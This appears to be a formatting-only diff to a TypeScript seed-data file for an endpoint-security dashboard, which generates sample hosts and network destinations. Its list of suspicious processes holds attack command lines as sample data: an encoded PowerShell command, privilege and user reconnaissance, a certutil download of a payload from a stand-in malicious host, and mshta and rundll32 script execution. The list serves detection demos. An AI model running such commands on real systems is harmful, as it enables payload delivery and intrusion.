@@ -30,12 +30,27 @@ const ENDPOINT_TEMPLATES: Array<{
   { hostname: "WS-DEV-03", os: "windows", osVersion: "Windows 11 22H2", tags: ["engineering", "workstation"] },
   { hostname: "LAPTOP-EXEC-02", os: "windows", osVersion: "Windows 11 23H2", tags: ["executive", "laptop"] },
   { hostname: "LAPTOP-SALES-01", os: "windows", osVersion: "Windows 10 22H2", tags: ["sales", "laptop"] },
-  { hostname: "SRV-DC-01", os: "windows", osVersion: "Windows Server 2022", tags: ["server", "domain-controller", "production"] },
-  { hostname: "SRV-SQL-02", os: "windows", osVersion: "Windows Server 2022", tags: ["server", "database", "production"] },
+  {
+    hostname: "SRV-DC-01",
+    os: "windows",
+    osVersion: "Windows Server 2022",
+    tags: ["server", "domain-controller", "production"],
+  },
+  {
+    hostname: "SRV-SQL-02",
+    os: "windows",
+    osVersion: "Windows Server 2022",
+    tags: ["server", "database", "production"],
+  },
   { hostname: "SRV-WEB-01", os: "windows", osVersion: "Windows Server 2022", tags: ["server", "web", "production"] },
   { hostname: "LNX-WEB-01", os: "linux", osVersion: "Ubuntu 22.04 LTS", tags: ["server", "web", "production"] },
   { hostname: "LNX-DB-01", os: "linux", osVersion: "Ubuntu 22.04 LTS", tags: ["server", "database", "production"] },
-  { hostname: "LNX-K8S-NODE-03", os: "linux", osVersion: "Ubuntu 24.04 LTS", tags: ["server", "kubernetes", "production"] },
+  {
+    hostname: "LNX-K8S-NODE-03",
+    os: "linux",
+    osVersion: "Ubuntu 24.04 LTS",
+    tags: ["server", "kubernetes", "production"],
+  },
   { hostname: "MAC-DESIGN-01", os: "macos", osVersion: "macOS Sonoma 14.3", tags: ["design", "workstation"] },
   { hostname: "MAC-EXEC-01", os: "macos", osVersion: "macOS Sonoma 14.4", tags: ["executive", "laptop"] },
 ];
@@ -43,15 +58,26 @@ const ENDPOINT_TEMPLATES: Array<{
 const SUSPICIOUS_PROCESSES = [
   { name: "powershell.exe", user: "SYSTEM", cmdline: "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA" },
   { name: "cmd.exe", user: "SYSTEM", cmdline: "cmd.exe /c whoami /priv && net user" },
-  { name: "certutil.exe", user: "admin", cmdline: "certutil.exe -urlcache -split -f http://malicious.example.com/payload.exe" },
-  { name: "mshta.exe", user: "SYSTEM", cmdline: "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run\")" },
-  { name: "rundll32.exe", user: "SYSTEM", cmdline: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"" },
+  {
+    name: "certutil.exe",
+    user: "admin",
+    cmdline: "certutil.exe -urlcache -split -f http://malicious.example.com/payload.exe",
+  },
+  { name: "mshta.exe", user: "SYSTEM", cmdline: 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run")' },
+  { name: "rundll32.exe", user: "SYSTEM", cmdline: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"' },
 ];
 
 const TOP_DESTINATIONS = [
-  "10.0.1.1", "10.0.1.254", "192.168.1.1", "api.microsoft.com",
-  "update.microsoft.com", "crowdstrike.com", "github.com",
-  "slack.com", "amazonaws.com", "login.microsoftonline.com",
+  "10.0.1.1",
+  "10.0.1.254",
+  "192.168.1.1",
+  "api.microsoft.com",
+  "update.microsoft.com",
+  "crowdstrike.com",
+  "github.com",
+  "slack.com",
+  "amazonaws.com",
+  "login.microsoftonline.com",
 ];
 
 export async function seedEndpointAssets(orgId: string): Promise<EndpointAsset[]> {
@@ -72,9 +98,7 @@ export async function seedEndpointAssets(orgId: string): Promise<EndpointAsset[]
     const octet2 = randInt(0, 255);
     const octet3 = randInt(0, 255);
     const octet4 = randInt(1, 254);
-    const ipAddress = Math.random() < 0.7
-      ? `10.${octet2}.${octet3}.${octet4}`
-      : `192.168.${octet3}.${octet4}`;
+    const ipAddress = Math.random() < 0.7 ? `10.${octet2}.${octet3}.${octet4}` : `192.168.${octet3}.${octet4}`;
 
     const asset = await storage.createEndpointAsset({
       orgId,
